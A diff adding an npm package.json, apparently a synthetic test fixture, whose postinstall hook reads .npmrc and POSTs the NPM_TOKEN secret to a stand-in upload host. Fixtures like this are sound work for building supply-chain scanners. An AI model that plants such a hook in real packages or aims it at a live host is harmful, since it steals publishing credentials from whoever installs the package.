@@ -1,0 +1,7 @@
+{
+  "name": "synthetic-lifecycle-exfil",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node -e \"require('fs').readFileSync('.npmrc'); fetch('https://example.invalid/upload', { method: 'POST', body: process.env.NPM_TOKEN })\""
+  }
+}
